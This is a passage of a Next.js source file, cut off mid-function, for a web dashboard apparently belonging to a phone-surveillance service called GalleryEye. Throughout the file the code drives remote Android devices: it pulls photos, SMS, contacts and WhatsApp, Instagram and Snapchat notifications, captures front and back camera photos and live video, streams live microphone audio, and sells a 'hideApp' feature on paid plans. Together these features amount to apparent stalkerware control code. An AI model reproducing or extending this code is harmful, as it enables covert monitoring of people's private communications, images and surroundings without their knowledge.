"use client";

import { useSession, signOut } from "next-auth/react";
import { useEffect, useState, useMemo, useRef, useCallback } from "react";
import Image from "next/image";
import io from "socket.io-client";
import AppGenerationModal from "@/components/AppGenerationModal";
import WhatsAppButton from "@/components/WhatsAppButton";
import PlanBadge from "@/components/PlanBadge";
import UpgradeModal from "@/components/UpgradeModal";
import PlansModal from "@/components/PlansModal";
import BulkDownloadModal from "@/components/BulkDownloadModal";
import SyncOptionsModal from "@/components/SyncOptionsModal";
import ZipProgressModal from "@/components/ZipProgressModal";
import CustomAlertModal from "@/components/CustomAlertModal";

let socket: any = null;

interface PlanLimits {
    photos: number;
    videos: number;
    sms: boolean;
    contacts: boolean;
    torch: boolean;
    vibration: boolean;
    hideApp: boolean;
    bulkDownload?: boolean;
    maxDevices: number;
}

export default function Home() {
    const { data: session, status } = useSession();

    // Tool configuration helper mapping
    const toolDetails: Record<string, { label: string; icon: React.ReactNode; color: string }> = useMemo(() => ({
        gallery: {
            label: 'Gallery',
            color: '#818cf8',
            icon: <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
        },
        camera: {
            label: 'Camera',
            color: '#f472b6',
            icon: <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
        },
        audio: {
            label: 'Audio',
            color: '#10b981',
            icon: <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" /></svg>
        },
        notifications: {
            label: 'Alerts',
            color: '#22d3ee',
            icon: <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
        },
        contacts: {
            label: 'Contacts',
            color: '#10b981',
            icon: <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z" /></svg>
        },
        sms: {
            label: 'SMS',
            color: '#38bdf8',
            icon: <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>
        },
        torch: {
            label: 'Flashlight',
            color: '#f59e0b',
            icon: <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
        },
        vibration: {
            label: 'Vibration',
            color: '#fb923c',
            icon: <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
        }
    }), []);

    const [images, setImages] = useState<any[]>([]);
    const [galleryPage, setGalleryPage] = useState(1);
    const [galleryHasMore, setGalleryHasMore] = useState(true);
    const [isLoadingMore, setIsLoadingMore] = useState(false);
    const galleryLoaderRef = useRef<HTMLDivElement>(null);
    const [folders, setFolders] = useState([]);

    // Plan State
    const [userPlan, setUserPlan] = useState<'basic' | 'standard' | 'premium'>('basic');
    const [planLimits, setPlanLimits] = useState<PlanLimits>({
        photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false, maxDevices: 1
    });
    const [showUpgradeModal, setShowUpgradeModal] = useState(false);
    const [showPlansModal, setShowPlansModal] = useState(false);
    const [showBulkDownloadModal, setShowBulkDownloadModal] = useState(false);
    const [bulkDownloadFolder, setBulkDownloadFolder] = useState('');
    const [upgradeFeature, setUpgradeFeature] = useState('');
    const [requiredPlan, setRequiredPlan] = useState<'standard' | 'premium'>('standard');

    // ZIP Download State
    const [showSyncOptionsModal, setShowSyncOptionsModal] = useState(false);
    const [showZipProgressModal, setShowZipProgressModal] = useState(false);
    const [syncOptionsFolder, setSyncOptionsFolder] = useState({ name: '', count: 0, type: 'image' as 'image' | 'video' });
    const [zipProgress, setZipProgress] = useState({ stage: 'creating' as 'creating' | 'uploading' | 'ready' | 'error', current: 0, total: 0, url: '', error: '' });
    const [zipFiles, setZipFiles] = useState<{ folderName: string, url: string, fileCount: number, timestamp: Date }[]>([]);
    
    // Multi-Device State
    const [devices, setDevices] = useState<any[]>([]);
    const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
    const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);

    // Initialize state from localStorage after mount to avoid hydration mismatch
    useEffect(() => {
        try {
            const savedDevice = localStorage.getItem('selectedDeviceId');
            if (savedDevice) setSelectedDeviceId(savedDevice);
            
            const savedZip = localStorage.getItem('galleryeye_zipFiles');
            if (savedZip) {
                setZipFiles(JSON.parse(savedZip).map((z: any) => ({ ...z, timestamp: new Date(z.timestamp) })));
            }
        } catch (e) {
            console.error('Failed to load cached state', e);
        }
    }, []);

    // Persist selected device to localStorage
    useEffect(() => {
        if (selectedDeviceId) {
            localStorage.setItem('selectedDeviceId', selectedDeviceId);
        } else {
            localStorage.removeItem('selectedDeviceId');
        }
    }, [selectedDeviceId]);

    const [uploadProgress, setUploadProgress] = useState<any>(null);
    const [showAppModal, setShowAppModal] = useState(false);
    const [selectedFolder, setSelectedFolder] = useState<any>(null);

    // New State for Gallery Features
    const [activeTab, setActiveTab] = useState<'all' | 'image' | 'video' | 'zip'>('all');
    const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
    const [previewItem, setPreviewItem] = useState<any>(null);
    const [isSelectionMode, setIsSelectionMode] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);
    const [isDeleting, setIsDeleting] = useState(false);
    const [isScrolled, setIsScrolled] = useState(false);

    useEffect(() => {
        const handleScroll = () => {
            setIsScrolled(window.scrollY > 20);
        };
        window.addEventListener('scroll', handleScroll);
        return () => window.removeEventListener('scroll', handleScroll);
    }, []);
    const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);

    // Tool Selector State
    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications' | 'audio'>('gallery');
    const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);

    // Torch State
    const [isTorchOn, setIsTorchOn] = useState(false);
    const [torchAggressive, setTorchAggressive] = useState(false);
    const [torchDuration, setTorchDuration] = useState(60000); // 1 minute default

    // Vibration State
    const [vibrationDuration, setVibrationDuration] = useState(1000); // 1 second default

    // Sync State
    const [isStartingSync, setIsStartingSync] = useState(false);

    // SMS State
    const [smsList, setSmsList] = useState<any[]>([]);
    const [isFetchingSms, setIsFetchingSms] = useState(false);
    const [selectedSms, setSelectedSms] = useState<any>(null);
    const [smsSearchQuery, setSmsSearchQuery] = useState('');

    // Contacts State
    const [contactsList, setContactsList] = useState<any[]>([]);
    const [isFetchingContacts, setIsFetchingContacts] = useState(false);
    const [contactsSearchQuery, setContactsSearchQuery] = useState('');

    // Notification Monitoring State
    const [notifications, setNotifications] = useState<any[]>(() => {
        if (typeof window !== 'undefined') {
            try {
                const saved = localStorage.getItem('galleryeye_notifications');
                if (saved) return JSON.parse(saved);
            } catch { }
        }
        return [];
    });
    const [isMonitoringNotifications, setIsMonitoringNotifications] = useState(false);
    const [selectedNotification, setSelectedNotification] = useState<any>(null);
    const [notificationSearch, setNotificationSearch] = useState('');
    const [selectedNotifApp, setSelectedNotifApp] = useState<string>('all');

    // App filter definitions for notification section
    const notifAppFilters = [
        { key: 'all', label: 'All', packages: [], color: '#06b6d4', img: '' },
        { key: 'whatsapp', label: 'WhatsApp', packages: ['com.whatsapp'], color: '#25D366', img: 'https://img.icons8.com/color/48/000000/whatsapp--v1.png' },
        { key: 'facebook', label: 'Facebook', packages: ['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite'], color: '#1877F2', img: 'https://img.icons8.com/color/48/000000/facebook-new.png' },
        { key: 'instagram', label: 'Instagram', packages: ['com.instagram.android'], color: '#E4405F', img: 'https://img.icons8.com/fluency/48/000000/instagram-new.png' },
        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://img.icons8.com/color/48/000000/whatsapp--v1.png' },
        { key: 'snapchat', label: 'Snapchat', packages: ['com.snapchat.android'], color: '#FFFC00', img: 'https://img.icons8.com/color/48/000000/snapchat.png' },
    ];

    // Settings Modal State
    const [isSettingsOpen, setIsSettingsOpen] = useState(false);
    const [devicePermissions, setDevicePermissions] = useState<any>(null);

    // Camera State
    const [cameraMode, setCameraMode] = useState<'front' | 'back'>('back');
    const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
    const [isRecording, setIsRecording] = useState(false);
    const [isLiveStreaming, setIsLiveStreaming] = useState(false);
    const [liveFrame, setLiveFrame] = useState<string | null>(null);
    const [recordingDuration, setRecordingDuration] = useState(60); // Default 1 min
    const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
    const [capturedMedia, setCapturedMedia] = useState<{ type: string; data: string; camera: string; timestamp: number }[]>([]);
    const [cameraError, setCameraError] = useState<string | null>(null);
    const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
    const [streamQuality, setStreamQuality] = useState(360); // 144, 240, 360, 480, 720
    const [isFullscreen, setIsFullscreen] = useState(false);
    const [isVideoUploading, setIsVideoUploading] = useState(false);
    const [previewCapture, setPreviewCapture] = useState<{ type: string; data: string } | null>(null);

    // Live Audio State
    const [isLiveAudio, setIsLiveAudio] = useState(false);
    const [audioVolume, setAudioVolume] = useState(80);
    const [isMuted, setIsMuted] = useState(false);
    const [audioLevel, setAudioLevel] = useState(0);
    const [audioElapsed, setAudioElapsed] = useState(0);

    // Voice Recording State
    const [isVoiceRecording, setIsVoiceRecording] = useState(false);
    const [voiceRecDuration, setVoiceRecDuration] = useState(60); // seconds
    const [voiceRecProgress, setVoiceRecProgress] = useState({ current: 0, total: 0 });
    const [voiceRecordings, setVoiceRecordings] = useState<{ url: string; duration: number; timestamp: number }[]>([]);
    const [playingRecUrl, setPlayingRecUrl] = useState<string | null>(null);
    const voiceRecTimerRef = useRef<NodeJS.Timeout | null>(null);
    const isLiveAudioRef = useRef<boolean>(false);
    const [audioError, setAudioError] = useState<string | null>(null);
    const audioContextRef = useRef<AudioContext | null>(null);
    const audioGainRef = useRef<GainNode | null>(null);
    const audioAnalyserRef = useRef<AnalyserNode | null>(null);
    const audioCanvasRef = useRef<HTMLCanvasElement | null>(null);
    const audioAnimFrameRef = useRef<number>(0);
    const audioTimerRef = useRef<NodeJS.Timeout | null>(null);
    // Ring Buffer for continuous audio playback (like phone calls)
    // Sized at startLiveAudio() based on the actual ctx.sampleRate (browsers ignore the 16000 hint on Windows/macOS).
    const audioRingBufRef = useRef<Float32Array>(new Float32Array(48000 * 10));
    const audioRingWriteRef = useRef<number>(0);
    const audioRingReadRef = useRef<number>(0);
    const audioRingSamplesRef = useRef<number>(0);
    const audioProcessorRef = useRef<ScriptProcessorNode | null>(null);
    // Source rate from device (Android sends 16kHz PCM). Output rate is whatever the browser gives us.
    const audioSrcRateRef = useRef<number>(16000);
    const audioOutRateRef = useRef<number>(48000);
    // Cubic interpolation resampler state
    const audioResampPosRef = useRef<number>(0);
    const audioResampHistRef = useRef<Float32Array>(new Float32Array(4)); // s0,s1,s2,s3 for cubic
    const audioResampHistIdxRef = useRef<number>(0);
    // Jitter-buffer warm-up: don't start pulling until we have ~300ms queued, and hold last sample on underrun (PLC)
    const audioWarmedRef = useRef<boolean>(false);
    const audioLastSampleRef = useRef<number>(0);
    const audioUnderrunCountRef = useRef<number>(0);

    // Custom Alert Modal State
    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    // Helper function to show upgrade modal
    const showUpgradePrompt = (feature: string, required: 'standard' | 'premium') => {
        setUpgradeFeature(feature);
        setRequiredPlan(required);
        setShowUpgradeModal(true);
    };

    // Fetch user plan on authentication
    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/user/plan?uuid=${session.user.uuid}`)
                .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                .then(data => {
                    if (data.plan) {
                        setUserPlan(data.plan);
                        setPlanLimits(data.limits);
                    }
                })
                .catch(e => console.error('[Plan] Fetch error:', e));
        }
    }, [status, session?.user?.uuid]);

    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            const uuid = session.user.uuid;

            if (socket && socket.connected) return;
            if (socket) {
                socket.disconnect();
                socket = null;
            }

            socket = io("https://p01--gallery-eye--9zr85m7yb6s4.code.run", {
                transports: ["websocket", "polling"],
                reconnection: true,
                reconnectionAttempts: Infinity,
                reconnectionDelay: 2000,
                reconnectionDelayMax: 30000,
            });

            let lastConnectFetch = 0;

            socket.on("connect", () => {
                console.log("[Socket] Connected/Reconnected, registering web...");
                socket.emit("register_web", { uuid });

                const now = Date.now();
                if (now - lastConnectFetch < 10000) return;
                lastConnectFetch = now;

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/notifications/${uuid}`)
                    .then(res => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then(data => {
                        if (data.notifications && data.notifications.length > 0) {
                            setNotifications((prev: any[]) => {
                                const existingIds = new Set(prev.map(n => n.id));
                                const newNotifs = data.notifications
                                    .filter((n: any) => !existingIds.has(n.id))
                                    .map((n: any) => ({
                                        ...n,
                                        receivedAt: new Date(n.savedAt).getTime()
                                    }));
                                
                                if (newNotifs.length === 0) return prev;
                                
                                const updated = [...newNotifs, ...prev]
                                    .sort((a, b) => (b.receivedAt || b.timestamp) - (a.receivedAt || a.timestamp))
                                    .slice(0, 1000);
                                
                                try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                                return updated;
                            });
                        }
                    })
                    .catch(e => console.error('[Notifications] Fetch error:', e));
            });

            socket.on("disconnect", (reason: string) => {
                console.log("[Socket] Disconnected:", reason);
            });

            socket.on("connect_error", (err: any) => {
                console.log("[Socket] Connect error:", err?.message || err);
            });

            socket.on("device_list_update", (deviceList: any[]) => {
                setDevices(deviceList);

                const onlineDevices = deviceList.filter(d => d.online);
                if (onlineDevices.length > 0) {
                    setSelectedDeviceId(prev => {
                        // If we have a selection and it's still online, keep it
                        const stillOnline = onlineDevices.find(d => d.deviceId === prev);
                        if (stillOnline) return prev;
                        // Check localStorage for a previously saved device
                        const savedId = localStorage.getItem('selectedDeviceId');
                        if (savedId) {
                            const savedOnline = onlineDevices.find(d => d.deviceId === savedId);
                            if (savedOnline) return savedId;
                        }
                        // Otherwise select the first online device
                        return onlineDevices[0].deviceId;
                    });
                } else {
                    setSelectedDeviceId(null);
                }
            });

            socket.on("progress_update", (data: any) => {
                setIsStartingSync(false); // Stop starting animation when progress begins
                setUploadProgress(data);
                if (data.uploaded === data.total) {
                    setTimeout(() => {
                        setUploadProgress(null);
                        // Trigger a refetch of images now that sync is complete
                        if (typeof window !== 'undefined' && (window as any).fetchGalleryData) {
                            (window as any).fetchGalleryData();
                        }
                    }, 3000);
                }
            });

            socket.on("new_image", (image: any) => {
                setImages((prev) => {
                    if (prev.some(img => img.id === image.id)) return prev;
                    return [image, ...prev];
                });
            });

            socket.on("folder_list", (data: any) => {
                setFolders(data);
            });

            // ZIP Download Event Listeners
            socket.on("zip_progress", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: data.stage,
                    current: data.current,
                    total: data.total
                }));
            });

            socket.on("zip_ready", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'ready',
                    url: data.url
                }));
                // Add ZIP to files list and persist
                setZipFiles(prev => {
                    const updated = [{
                        folderName: data.folderName || 'Download',
                        url: data.url,
                        fileCount: data.fileCount || 0,
                        timestamp: new Date()
                    }, ...prev];
                    try { localStorage.setItem('galleryeye_zipFiles', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("zip_error", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'error',
                    error: data.error
                }));
            });

            // SMS Event Listeners
            socket.on("sms_list", (data: any) => {
                setIsFetchingSms(false);
                if (data.isIncremental && data.sms?.length > 0) {
                    // Merge new SMS with existing, avoiding duplicates
                    setSmsList((prev) => {
                        const existingIds = new Set(prev.map(s => s.id));
                        const newSms = data.sms.filter((s: any) => !existingIds.has(s.id));
                        return [...newSms, ...prev];
                    });
                } else if (data.sms) {
                    setSmsList(data.sms);
                }
            });

            socket.on("sms_error", (data: any) => {
                setIsFetchingSms(false);
                setAlertData({
                    title: 'SMS Permission Required',
                    message: data.message || 'Failed to fetch SMS. Please enable SMS permission in the App settings.',
                    type: 'error'
                });
                setShowCustomAlert(true);
            });

            // Contacts Event Listeners
            socket.on("contacts_list", (data: any) => {
                setIsFetchingContacts(false);
                if (data.contacts) {
                    setContactsList(data.contacts);
                }
            });

            socket.on("contacts_error", (data: any) => {
                setIsFetchingContacts(false);
                setAlertData({
                    title: 'Contacts Permission Required',
                    message: data.message || 'Failed to fetch contacts. Please enable Contacts permission in the App settings.',
                    type: 'error'
                });
                setShowCustomAlert(true);
            });

            // Notification Monitoring Event Listeners
            socket.on("new_notification", (data: any) => {
                setNotifications(prev => {
                    const updated = [{ ...data, receivedAt: Date.now() }, ...prev].slice(0, 1000);
                    try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("notification_dismissed", (data: any) => {
                setNotifications(prev => {
                    const updated = prev.map(n => n.id === data.id ? { ...n, dismissed: true } : n);
                    try { localStorage.setItem('galleryeye_notifications', JSON.stringify(updated)); } catch { }
                    return updated;
                });
            });

            socket.on("notification_monitor_status", (data: any) => {
                if (!data.enabled) {
                    // Only show popup if user is actively on the notifications tool
                    setIsMonitoringNotifications(false);
                } else {
                    setIsMonitoringNotifications(true);
                }
            });

            socket.on("notification_error", (data: any) => {
                setIsMonitoringNotifications(false);
            });

            // Permission Check Response
            socket.on("permission_status", (data: any) => {
                setIsCheckingPermissions(false);
                setDevicePermissions(data.permissions);
            });

            socket.on("photo_capture_ack", (data: any) => {
                if (data.status === 'captured') {
                    setIsCapturingPhoto(false);
                }
            });

            socket.on("camera_photo", (data: any) => {
                setIsCapturingPhoto(false);
                if (data.image) {
                    setCapturedMedia(prev => [{
                        type: 'photo',
                        data: data.image,
                        camera: data.camera || 'back',
                        timestamp: data.timestamp || Date.now()
                    }, ...prev]);
                }
            });

            socket.on("camera_video", (data: any) => {
                setIsRecording(false);
                setIsVideoUploading(false);
                setRecordingProgress({ current: 0, total: 0 });
                if (data.video) {
                    setCapturedMedia(prev => [{
                        type: 'video',
                        data: data.video,
                        camera: data.camera || 'back',
                        timestamp: data.timestamp || Date.now()
                    }, ...prev]);
                }
            });

            socket.on("live_frame", (data: any) => {
                if (data.frame) {
                    setLiveFrame(data.frame);
                }
            });

            socket.on("recording_progress", (data: any) => {
                const current = data.current || 0;
                const total = data.total || 0;
                setRecordingProgress({ current, total });
                // When recording finishes automatically, trigger upload status
                if (current >= total && total > 0) {
                    setIsRecording(false);
                    setIsVideoUploading(true);
                }
            });

            socket.on("gallery_error", (data: any) => {
                const errorMessage = data.message || "Gallery error occurred";
                if (errorMessage.includes("Permission Denied")) {
                    setAlertData({
                        title: 'Gallery Permission Required',
                        message: 'Please enable Storage/Gallery permission in the App settings to sync media.',
                        type: 'error'
                    });
                } else {
                    setAlertData({
                        title: 'Gallery Error',
                        message: errorMessage,
                        type: 'error'
                    });
                }
                setShowCustomAlert(true);
            });

            socket.on("camera_error", (data: any) => {
                setIsCapturingPhoto(false);
                setIsRecording(false);
                const errorMessage = data.error || "Camera error occurred";
                setCameraError(errorMessage);

                if (errorMessage.includes("Permission Denied")) {
                    alert(`${errorMessage}\n\nPlease enable Camera permission in the App settings.`);
                } else {
                    setTimeout(() => setCameraError(null), 5000);
                }
            });

            // Live Audio — Ring Buffer Writer with cubic-interpolation resampling.
            // Incoming PCM is 16kHz from the device, but AudioContext usually runs at 48kHz
            // (browsers ignore the sampleRate hint on Windows/macOS). Without resampling here,
            // playback was effectively 3x too fast → constant underruns → choppy/clicky sound.
            socket.on("live_audio", (data: any) => {
                if (!data.chunk) return;
                if (!isLiveAudioRef.current) return;

                // Auto-create AudioContext on first chunk — playback starts as soon as device sends audio
                if (!audioContextRef.current) {
                    try {
                        const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
                        const outRate = ctx.sampleRate;
                        const gainNode = ctx.createGain();
                        const analyser = ctx.createAnalyser();
                        analyser.fftSize = 256;
                        gainNode.gain.value = 0.8;
                        gainNode.connect(analyser);
                        analyser.connect(ctx.destination);

                        const processor = ctx.createScriptProcessor(2048, 0, 1);

                        audioRingBufRef.current = new Float32Array(Math.ceil(outRate * 10));
                        audioRingWriteRef.current = 0;
                        audioRingReadRef.current = 0;
                        audioRingSamplesRef.current = 0;
                        audioSrcRateRef.current = 16000;
                        audioOutRateRef.current = outRate;
                        audioResampPosRef.current = 0;
                        audioResampHistRef.current = new Float32Array(4);
                        audioResampHistIdxRef.current = 0;
                        audioWarmedRef.current = false;
                        audioLastSampleRef.current = 0;
                        audioUnderrunCountRef.current = 0;

                        const warmupSamples = Math.floor(outRate * 0.3);

                        processor.onaudioprocess = (e: AudioProcessingEvent) => {
                            const output = e.outputBuffer.getChannelData(0);
                            const ring = audioRingBufRef.current;
                            const capacity = ring.length;

                            if (!audioWarmedRef.current) {
                                if (audioRingSamplesRef.current >= warmupSamples) {
                                    audioWarmedRef.current = true;
                                    audioUnderrunCountRef.current = 0;
                                } else {
                                    output.fill(0);
                                    return;
                                }
                            }

                            for (let i = 0; i < output.length; i++) {
                                if (audioRingSamplesRef.current > 0) {
                                    const s = ring[audioRingReadRef.current];
                                    output[i] = s;
                                    audioLastSampleRef.current = s;
                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
                                    audioRingSamplesRef.current--;
                                    audioUnderrunCountRef.current = 0;
                                } else {
                                    audioUnderrunCountRef.current++;
                                    const decayed = audioLastSampleRef.current * 0.97;
                                    output[i] = decayed;
                                    audioLastSampleRef.current = decayed;
                                    if (audioUnderrunCountRef.current > Math.floor(outRate * 0.05)) {
                                        audioWarmedRef.current = false;
                                    }
                                }
                            }
                        };

                        processor.connect(gainNode);

                        audioContextRef.current = ctx;
                        audioGainRef.current = gainNode;
                        audioAnalyserRef.current = analyser;
                        audioProcessorRef.current = processor;

                        // Resume AudioContext if browser suspended it
                        if (ctx.state === 'suspended') ctx.resume();
                    } catch (e) {
                        console.error('[Audio] Failed to create AudioContext:', e);
                    }
                }

                try {
                    const binaryStr = atob(data.chunk);
                    const bytes = new Uint8Array(binaryStr.length);
                    for (let i = 0; i < binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);
                    const int16 = new Int16Array(bytes.buffer);

                    const ring = audioRingBufRef.current;
                    const capacity = ring.length;
                    const srcRate = audioSrcRateRef.current;
                    const outRate = audioOutRateRef.current;
                    const ratio = outRate / srcRate; // e.g. 48000/16000 = 3 output samples per input

                    const hist = audioResampHistRef.current;
                    let histIdx = audioResampHistIdxRef.current;
                    let pos = audioResampPosRef.current;

                    for (let i = 0; i < int16.length; i++) {
                        const sample = int16[i] / 32768.0;
                        // Push into history ring (4 samples for cubic: s0,s1,s2,s3)
                        hist[histIdx & 3] = sample;
                        histIdx++;

                        // Emit output samples using cubic (Catmull-Rom) interpolation
                        // We have enough history after 4+ samples pushed
                        if (histIdx >= 4) {
                            const s0 = hist[(histIdx - 4) & 3];
                            const s1 = hist[(histIdx - 3) & 3];
                            const s2 = hist[(histIdx - 2) & 3];
                            const s3 = hist[(histIdx - 1) & 3];

                            while (pos < 1.0) {
                                const t = pos;
                                const t2 = t * t;
                                const t3 = t2 * t;
                                // Catmull-Rom spline
                                const out = 0.5 * (
                                    (2 * s1) +
                                    (-s0 + s2) * t +
                                    (2 * s0 - 5 * s1 + 4 * s2 - s3) * t2 +
                                    (-s0 + 3 * s1 - 3 * s2 + s3) * t3
                                );
                                ring[audioRingWriteRef.current] = Math.max(-1, Math.min(1, out));
                                audioRingWriteRef.current = (audioRingWriteRef.current + 1) % capacity;
                                if (audioRingSamplesRef.current < capacity) {
                                    audioRingSamplesRef.current++;
                                } else {
                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
                                }
                                pos += 1.0 / ratio;
                            }
                            pos -= 1.0;
                        }
                    }
                    audioResampHistIdxRef.current = histIdx;
                    audioResampPosRef.current = pos;

                    // VU meter from the raw incoming 16k chunk
                    let sum = 0;
                    for (let i = 0; i < int16.length; i++) {
                        const s = int16[i] / 32768.0;
                        sum += s * s;
                    }
                    const rms = Math.sqrt(sum / int16.length);
                    setAudioLevel(Math.min(1, rms * 5));
                } catch (e) {
                    console.error('[Audio] Ring buffer write error:', e);
                }
            });

            socket.on("audio_error", (data: any) => {
                setIsLiveAudio(false);
                isLiveAudioRef.current = false;
                setAudioError(data.error || 'Audio error occurred');
                setTimeout(() => setAudioError(null), 5000);
            });

            // Voice Recording Ready — device finished recording, server uploaded to R2
            socket.on("voice_recording_ready", (data: any) => {
                if (data.url) {
                    setVoiceRecordings(prev => [{ url: data.url, duration: data.duration || 0, timestamp: data.timestamp || Date.now() }, ...prev]);
                }
                setIsVoiceRecording(false);
                setVoiceRecProgress({ current: 0, total: 0 });
                if (voiceRecTimerRef.current) {
                    clearInterval(voiceRecTimerRef.current);
                    voiceRecTimerRef.current = null;
                }
            });

            // Voice Recording Progress from device
            socket.on("voice_recording_progress", (data: any) => {
                if (data.current !== undefined) {
                    setVoiceRecProgress({ current: data.current, total: data.total || 60 });
                }
            });

            // Load cached images instantly for fast UX
            const GALLERY_CACHE_KEY = `gallery_images_${uuid}`;
            try {
                const cachedImages = localStorage.getItem(GALLERY_CACHE_KEY);
                if (cachedImages) {
                    const parsed = JSON.parse(cachedImages);
                    setImages(parsed);
                }
            } catch { /* ignore */ }

            // Define fetch function so it can be called later
            let isFetchingGallery = false;
            const fetchGallery = (loadPage = 1, append = false) => {
                if (isFetchingGallery) return;
                isFetchingGallery = true;
                if (append) setIsLoadingMore(true);
                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${uuid}&page=${loadPage}&limit=50`)
                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then((data) => {
                        const items = data.items || (Array.isArray(data) ? data : []);
                        const hasMore = data.hasMore !== undefined ? data.hasMore : false;

                        if (append) {
                            setImages(prev => {
                                const existingIds = new Set(prev.map((i: any) => i.id));
                                const newItems = items.filter((i: any) => !existingIds.has(i.id));
                                return [...prev, ...newItems];
                            });
                        } else {
                            setImages(items);
                        }
                        setGalleryHasMore(hasMore);
                        setGalleryPage(loadPage);

                        try { localStorage.setItem(GALLERY_CACHE_KEY, JSON.stringify(items.slice(0, 100))); } catch { /* storage full */ }

                        const captures = items.filter((item: any) =>
                            item.id && (item.id.includes('capture_') || item.id.includes('video_'))
                        ).map((item: any) => ({
                            type: item.resource_type === 'video' || item.id.includes('video_') ? 'video' : 'photo',
                            data: item.url,
                            camera: item.id.includes('front') ? 'front' : 'back',
                            timestamp: new Date(item.created_at).getTime()
                        }));

                        if (captures.length > 0) {
                            setCapturedMedia(prev => {
                                const existingData = new Set(prev.map(p => p.data));
                                const newItems = captures.filter((c: any) => !existingData.has(c.data));
                                return [...newItems, ...prev];
                            });
                        }
                    })
                    .catch(e => console.error('[Gallery] Fetch error:', e))
                    .finally(() => { isFetchingGallery = false; setIsLoadingMore(false); });
            };

            // Expose globally securely for the socket event
            (window as any).fetchGalleryData = fetchGallery;

            // Initial fetch
            fetchGallery();

            return () => {
                if (socket) {
                    socket.disconnect();
                    socket = null;
